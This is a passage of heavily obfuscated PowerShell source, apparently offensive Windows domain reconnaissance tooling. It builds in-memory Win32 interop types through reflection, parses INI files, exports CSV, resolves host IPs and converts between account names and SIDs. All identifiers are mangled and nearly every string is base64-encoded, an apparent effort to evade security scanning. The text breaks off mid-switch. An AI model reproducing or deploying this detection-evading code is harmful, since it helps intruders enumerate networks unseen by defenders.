
function __/=\/\/==\__/\_/\
{
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${_/=\_____/\____/\_} = [Guid]::NewGuid().ToString()
    )
    ${__/\_/=\_/\/==\/\} = [AppDomain]::CurrentDomain.GetAssemblies()
    ForEach (${_/\/=\/=\/=\_/=\_} in ${__/\_/=\_/\/==\/\}) {
        if (${_/\/=\/=\/=\_/=\_}.FullName -and (${_/\/=\/=\/=\_/=\_}.FullName.Split(',')[0] -eq ${_/=\_____/\____/\_})) {
            return ${_/\/=\/=\/=\_/=\_}
        }
    }
    ${_/====\/\/\___/\_} = New-Object Reflection.AssemblyName(${_/=\_____/\____/\_})
    $Domain = [AppDomain]::CurrentDomain
    ${_/=\_/==\/\_____/} = $Domain.DefineDynamicAssembly(${_/====\/\/\___/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4A'))))
    ${_/=\_/\__/==\/\__} = ${_/=\_/==\/\_____/}.DefineDynamicModule(${_/=\_____/\____/\_}, $False)
    return ${_/=\_/\__/==\/\__}
}
function _/=\/\/=\/\/\/\/=\
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        ${___/\/==\_/\/=\___},
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        ${_/==\/\/\/\___/\_/},
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        ${_/===\/\/==\/\/=\_},
        [Parameter(Position = 3)]
        [Type[]]
        ${_/=\/==\_/\/\/\_/=},
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${_/===\/\/=\_/=====},
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        ${_/==\/\/===\_/====},
        [Switch]
        ${__/\_/\_/\/\/=\_/=}
    )
    $Properties = @{
        DllName = ${___/\/==\_/\/=\___}
        FunctionName = ${_/==\/\/\/\___/\_/}
        ReturnType = ${_/===\/\/==\/\/=\_}
    }
    if (${_/=\/==\_/\/\/\_/=}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = ${_/=\/==\_/\/\/\_/=} }
    if (${_/===\/\/=\_/=====}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = ${_/===\/\/=\_/=====} }
    if (${_/==\/\/===\_/====}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = ${_/==\/\/===\_/====} }
    if (${__/\_/\_/\/\/=\_/=}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = ${__/\_/\_/\/\/=\_/=} }
    New-Object PSObject -Property $Properties
}
function __/\/==\_/\___/==\
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        ${___/\/==\_/\/=\___},
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        ${_/==\/\/\/\___/\_/},
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        ${_/===\/\/==\/\/=\_},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        ${_/=\/==\_/\/\/\_/=},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        ${_/===\/\/=\_/=====} = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        ${_/==\/\/===\_/====} = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        ${__/\_/\_/\/\/=\_/=},
        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_____/=\_/=\__/=\_},
        [ValidateNotNull()]
        [String]
        ${_/=\_/=\_/===\____} = ''
    )
    BEGIN
    {
        ${/=\/\____/\/==\_/} = @{}
    }
    PROCESS
    {
        if (${_____/=\_/=\__/=\_} -is [Reflection.Assembly])
        {
            if (${_/=\_/=\_/===\____})
            {
                ${/=\/\____/\/==\_/}[${___/\/==\_/\/=\___}] = ${_____/=\_/=\__/=\_}.GetType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwAXwAvAD0AXABfAC8APQA9AD0AXABfAF8AXwBfAH0ALgAkAHsAXwBfAF8ALwBcAC8APQA9AFwAXwAvAFwALwA9AFwAXwBfAF8AfQA='))))
            }
            else
            {
                ${/=\/\____/\/==\_/}[${___/\/==\_/\/=\___}] = ${_____/=\_/=\__/=\_}.GetType(${___/\/==\_/\/=\___})
            }
        }
        else
        {
            if (!${/=\/\____/\/==\_/}.ContainsKey(${___/\/==\_/\/=\___}))
            {
                if (${_/=\_/=\_/===\____})
                {
                    ${/=\/\____/\/==\_/}[${___/\/==\_/\/=\___}] = ${_____/=\_/=\__/=\_}.DefineType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwAXwAvAD0AXABfAC8APQA9AD0AXABfAF8AXwBfAH0ALgAkAHsAXwBfAF8ALwBcAC8APQA9AFwAXwAvAFwALwA9AFwAXwBfAF8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
                else
                {
                    ${/=\/\____/\/==\_/}[${___/\/==\_/\/=\___}] = ${_____/=\_/=\__/=\_}.DefineType(${___/\/==\_/\/=\___}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
            }
            ${___/\__/======\__/} = ${/=\/\____/\/==\_/}[${___/\/==\_/\/=\___}].DefineMethod(
                ${_/==\/\/\/\___/\_/},
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))),
                ${_/===\/\/==\/\/=\_},
                ${_/=\/==\_/\/\/\_/=})
            ${__/==\/=\_/=\/==\} = 1
            ForEach(${__/=\____________} in ${_/=\/==\_/\/\/\_/=})
            {
                if (${__/=\____________}.IsByRef)
                {
                    [void] ${___/\__/======\__/}.DefineParameter(${__/==\/=\_/=\/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $Null)
                }
                ${__/==\/=\_/=\/==\}++
            }
            ${__/=\_/=\/\____/\} = [Runtime.InteropServices.DllImportAttribute]
            ${_____/====\/\/\/=} = ${__/=\_/=\/\____/\}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            ${/=\__/\/\/=\__/==} = ${__/=\_/=\/\____/\}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            ${_/====\______/\__} = ${__/=\_/=\/\____/\}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
            if (${__/\_/\_/\/\/=\_/=}) { ${____/=\_______/=\} = $True } else { ${____/=\_______/=\} = $False }
            ${___/=\___/\____/\} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            ${_____/==\_/\___/=} = New-Object Reflection.Emit.CustomAttributeBuilder(${___/=\___/\____/\},
                ${___/\/==\_/\/=\___}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${_____/====\/\/\/=}, ${/=\__/\/\/=\__/==}, ${_/====\______/\__}),
                [Object[]] @(${____/=\_______/=\}, ([Runtime.InteropServices.CallingConvention] ${_/===\/\/=\_/=====}), ([Runtime.InteropServices.CharSet] ${_/==\/\/===\_/====})))
            ${___/\__/======\__/}.SetCustomAttribute(${_____/==\_/\___/=})
        }
    }
    END
    {
        if (${_____/=\_/=\__/=\_} -is [Reflection.Assembly])
        {
            return ${/=\/\____/\/==\_/}
        }
        ${_/==\/=\__/\_/\__} = @{}
        ForEach (${_/\_/\/=\_/====\_} in ${/=\/\____/\/==\_/}.Keys)
        {
            ${__/\_/=\/==\__/\/\} = ${/=\/\____/\/==\_/}[${_/\_/\/=\_/====\_}].CreateType()
            ${_/==\/=\__/\_/\__}[${_/\_/\/=\_/====\_}] = ${__/\_/=\/==\__/\/\}
        }
        return ${_/==\/=\__/\_/\__}
    }
}
function __/\_______/=\/\/\
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_____/=\_/=\__/=\_},
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${____/=\_/=\__/\/\_},
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        ${__/\_/=\/==\__/\/\},
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${__/=\/\/==\____/\/},
        [Switch]
        ${_/=\/==\_/\/=\/===}
    )
    if (${_____/=\_/=\__/=\_} -is [Reflection.Assembly])
    {
        return (${_____/=\_/=\__/=\_}.GetType(${____/=\_/=\__/\/\_}))
    }
    ${/====\__/==\_/\__} = ${__/\_/=\/==\__/\/\} -as [Type]
    ${/=====\/\/\_/\__/} = ${_____/=\_/=\__/=\_}.DefineEnum(${____/=\_/=\__/\/\_}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), ${/====\__/==\_/\__})
    if (${_/=\/==\_/\/=\/===})
    {
        ${/===\/===\_/\/==\} = [FlagsAttribute].GetConstructor(@())
        ${/====\/=\/==\/=\/} = New-Object Reflection.Emit.CustomAttributeBuilder(${/===\/===\_/\/==\}, @())
        ${/=====\/\/\_/\__/}.SetCustomAttribute(${/====\/=\/==\/=\/})
    }
    ForEach (${_/\_/\/=\_/====\_} in ${__/=\/\/==\____/\/}.Keys)
    {
        $Null = ${/=====\/\/\_/\__/}.DefineLiteral(${_/\_/\/=\_/====\_}, ${__/=\/\/==\____/\/}[${_/\_/\/=\_/====\_}] -as ${/====\__/==\_/\__})
    }
    ${/=====\/\/\_/\__/}.CreateType()
}
function _/=\_/==\____/\/=\
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        ${__/\_/\/\/\/\_____},
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        ${__/\_/=\/==\__/\/\},
        [Parameter(Position = 2)]
        [UInt16]
        ${___/\____/====\/=\},
        [Object[]]
        ${__/==\__/=\_/\_/\/}
    )
    @{
        Position = ${__/\_/\/\/\/\_____}
        Type = ${__/\_/=\/==\__/\/\} -as [Type]
        Offset = ${___/\____/====\/=\}
        MarshalAs = ${__/==\__/=\_/\_/\/}
    }
}
function _/==\__/=======\/=
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_____/=\_/=\__/=\_},
        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${____/=\_/=\__/\/\_},
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${__/\/===\/\_/=====},
        [Reflection.Emit.PackingSize]
        ${_/=\/\/==\/\/\_/==} = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        ${_/=\___/====\_/=\_}
    )
    if (${_____/=\_/=\__/=\_} -is [Reflection.Assembly])
    {
        return (${_____/=\_/=\__/=\_}.GetType(${____/=\_/=\__/\/\_}))
    }
    [Reflection.TypeAttributes] ${__/===\_/=\_/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAaQBDAGwAYQBzAHMALAAKACAAIAAgACAAIAAgACAAIABDAGwAYQBzAHMALAAKACAAIAAgACAAIAAgACAAIABQAHUAYgBsAGkAYwAsAAoAIAAgACAAIAAgACAAIAAgAFMAZQBhAGwAZQBkACwACgAgACAAIAAgACAAIAAgACAAQgBlAGYAbwByAGUARgBpAGUAbABkAEkAbgBpAHQA')))
    if (${_/=\___/====\_/=\_})
    {
        ${__/===\_/=\_/=\/=} = ${__/===\_/=\_/=\/=} -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        ${__/===\_/=\_/=\/=} = ${__/===\_/=\_/=\/=} -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    ${_/\/\/\__________} = ${_____/=\_/=\__/=\_}.DefineType(${____/=\_/=\__/\/\_}, ${__/===\_/=\_/=\/=}, [ValueType], ${_/=\/\/==\/\/\_/==})
    ${__/===\/=\__/==\/} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    ${____/\_/==\_/\/=\} = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    ${/=====\_/==\___/=} = New-Object Hashtable[](${__/\/===\/\_/=====}.Count)
    ForEach (${__/\_/=\_/\/==\__} in ${__/\/===\/\_/=====}.Keys)
    {
        ${/=\/\__/=\/\/\_/=} = ${__/\/===\/\_/=====}[${__/\_/=\_/\/==\__}][$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHMAaQB0AGkAbwBuAA==')))]
        ${/=====\_/==\___/=}[${/=\/\__/=\/\/\_/=}] = @{FieldName = ${__/\_/=\_/\/==\__}; Properties = ${__/\/===\/\_/=====}[${__/\_/=\_/\/==\__}]}
    }
    ForEach (${__/\_/=\_/\/==\__} in ${/=====\_/==\___/=})
    {
        ${__/=====\_/\/=\_/} = ${__/\_/=\_/\/==\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGUAbABkAE4AYQBtAGUA')))]
        ${_/\/=====\___/\__} = ${__/\_/=\_/\/==\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        ${___/\____/====\/=\} = ${_/\/=====\___/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA')))]
        ${__/\_/=\/==\__/\/\} = ${_/\/=====\___/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA=')))]
        ${__/==\__/=\_/\_/\/} = ${_/\/=====\___/\__}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHIAcwBoAGEAbABBAHMA')))]
        ${_/=\/\/=\____/=\_} = ${_/\/\/\__________}.DefineField(${__/=====\_/\/=\_/}, ${__/\_/=\/==\__/\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        if (${__/==\__/=\_/\_/\/})
        {
            ${__/\/==\/\_/\/==\} = ${__/==\__/=\_/\_/\/}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${__/==\__/=\_/\_/\/}[1])
            {
                ${_/===\/\_/=\_/\__} = ${__/==\__/=\_/\_/\/}[1]
                ${/==\____/=====\/=} = New-Object Reflection.Emit.CustomAttributeBuilder(${__/===\/=\__/==\/},
                    ${__/\/==\/\_/\/==\}, ${____/\_/==\_/\/=\}, @(${_/===\/\_/=\_/\__}))
            }
            else
            {
                ${/==\____/=====\/=} = New-Object Reflection.Emit.CustomAttributeBuilder(${__/===\/=\__/==\/}, [Object[]] @(${__/\/==\/\_/\/==\}))
            }
            ${_/=\/\/=\____/=\_}.SetCustomAttribute(${/==\____/=====\/=})
        }
        if (${_/=\___/====\_/=\_}) { ${_/=\/\/=\____/=\_}.SetOffset(${___/\____/====\/=\}) }
    }
    ${__/\__/\/\_/===\_} = ${_/\/\/\__________}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwBpAHoAZQA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        [Type[]] @())
    ${___/\___/=\/=\/\/} = ${__/\__/\/\_/===\_}.GetILGenerator()
    ${___/\___/=\/=\/\/}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${_/\/\/\__________})
    ${___/\___/=\/=\/\/}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${___/\___/=\/=\/\/}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    ${___/\___/=\/=\/\/}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${_/\/=\/\/===\____} = ${_/\/\/\__________}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG0AZQA='))),
        ${_/\/\/\__________},
        [Type[]] @([IntPtr]))
    ${_/\______/\_/\/==} = ${_/\/=\/\/===\____}.GetILGenerator()
    ${_/\______/\_/\/==}.Emit([Reflection.Emit.OpCodes]::Nop)
    ${_/\______/\_/\/==}.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    ${_/\______/\_/\/==}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${_/\/\/\__________})
    ${_/\______/\_/\/==}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${_/\______/\_/\/==}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], [Type])))
    ${_/\______/\_/\/==}.Emit([Reflection.Emit.OpCodes]::Unbox_Any, ${_/\/\/\__________})
    ${_/\______/\_/\/==}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${_/\/\/\__________}.CreateType()
}
filter __/\/\/\__/=\/\___ {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [ValidateScript({ Test-Path -Path $_ })]
        [String[]]
        $Path
    )
    ForEach(${____/====\_/===\_} in $Path) {
        ${/==========\/\/==} = @{}
        Switch -Regex -File ${____/====\_/===\_} {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAFsAKAAuACsAKQBcAF0A'))) 
            {
                ${_/\__/=\__/===\/\} = ${___/=\_/=\/\__/==}[1].Trim()
                ${/==========\/\/==}[${_/\__/=\__/===\/\}] = @{}
                ${_/=\___/=====\/\/} = 0
            }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoADsALgAqACkAJAA='))) 
            {
                ${__/====\/\/===\_/\} = ${___/=\_/=\/\__/==}[1].Trim()
                ${_/=\___/=====\/\/} = ${_/=\___/=====\/\/} + 1
                $Name = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) + ${_/=\___/=====\/\/}
                ${/==========\/\/==}[${_/\__/=\__/===\/\}][$Name] = ${__/====\/\/===\_/\}
            } 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuACsAPwApAFwAcwAqAD0AKAAuACoAKQA='))) 
            {
                $Name, ${__/====\/\/===\_/\} = ${___/=\_/=\/\__/==}[1..2]
                $Name = $Name.Trim()
                ${/=====\__/\______} = ${__/====\/\/===\_/\}.split(',') | % {$_.Trim()}
                if(${/=====\__/\______} -isnot [System.Array]) {${/=====\__/\______} = @(${/=====\__/\______})}
                ${/==========\/\/==}[${_/\__/=\__/===\/\}][$Name] = ${/=====\__/\______}
            }
        }
        ${/==========\/\/==}
    }
}
filter ______/\__/==\___/ {
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,
        [Parameter(Mandatory=$True, Position=0)]
        [String]
        [ValidateNotNullOrEmpty()]
        $OutFile
    )
    ${_/\__/=\/\/\/====} = $InputObject | ConvertTo-Csv -NoTypeInformation
    ${_/\/\_/==\/\/\/\/} = New-Object System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')));
    $Null = ${_/\/\_/==\/\/\/\/}.WaitOne()
    if (Test-Path -Path $OutFile) {
        ${_/\__/=\/\/\/====} | % { ${_/=\_____/\/===\_}=$True }{ if (${_/=\_____/\/===\_}) {${_/=\_____/\/===\_}=$False} else {$_} } | Out-File -Encoding $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAEMASQBJAA=='))) -Append -FilePath $OutFile
    }
    else {
        ${_/\__/=\/\/\/====} | Out-File -Encoding $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAEMASQBJAA=='))) -Append -FilePath $OutFile
    }
    ${_/\/\_/==\/\/\/\/}.ReleaseMutex()
}
filter _/=\/=\/=\_/=\/\_/ {
    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = $Env:ComputerName
    )
    try {
        ${___/==\/\/==\/=\/} = $ComputerName | _/=\_/=\/=\_/\__/\
        @(([Net.Dns]::GetHostEntry(${___/==\/\/==\/=\/})).AddressList) | % {
            if ($_.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                ${__/=\/\___/\/\/==} = New-Object PSObject
                ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${___/==\/\/==\/=\/}
                ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) $_.IPAddressToString
                ${__/=\/\___/\/\/==}
            }
        }
    }
    catch {
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIAByAGUAcwBvAGwAdgBlACAAaABvAHMAdAAgAHQAbwAgAGEAbgAgAEkAUAAgAEEAZABkAHIAZQBzAHMALgA=')))
    }
}
filter __/\__/=\_/\/=\___ {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        ${__/\/==\_/\___/\/\},
        [String]
        $Domain
    )
    ${__/\/==\_/\___/\/\} = ${__/\/==\_/\___/\/\} -Replace "/","\"
    if(${__/\/==\_/\___/\/\}.Contains("\")) {
        $Domain = ${__/\/==\_/\___/\/\}.Split("\")[0]
        ${__/\/==\_/\___/\/\} = ${__/\/==\_/\___/\/\}.Split("\")[1]
    }
    elseif(-not $Domain) {
        $Domain = (______/====\/=\__/).Name
    }
    try {
        ${_/=\_/\_/\____/=\} = (New-Object System.Security.Principal.NTAccount($Domain, ${__/\/==\_/\___/\/\}))
        ${__/\/=\/\_/\/====\} = ${_/=\_/\_/\____/=\}.Translate([System.Security.Principal.SecurityIdentifier]).Value
        ${__/=\/\___/\/\/==} = New-Object PSObject
        ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) ${__/\/==\_/\___/\/\}
        ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ${__/\/=\/\_/\/====\}
        ${__/=\/\___/\/\/==}
    }
    catch {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAG8AYgBqAGUAYwB0AC8AbgBhAG0AZQA6ACAAJABEAG8AbQBhAGkAbgBcACQAewBfAF8ALwBcAC8APQA9AFwAXwAvAFwAXwBfAF8ALwBcAC8AXAB9AA==')))
        $Null
    }
}
filter __/\_/\_/\__/\/\/\ {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [ValidatePattern('^S-1-.*')]
        ${__/\/=\/\_/\/====\}
    )
    try {
        ${/==\/===\/=\_/=\_} = ${__/\/=\/\_/\/====\}.trim('*')
        Switch (${/==\/===\/=\_/=\_}) {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGIAbwBkAHkA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA0AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
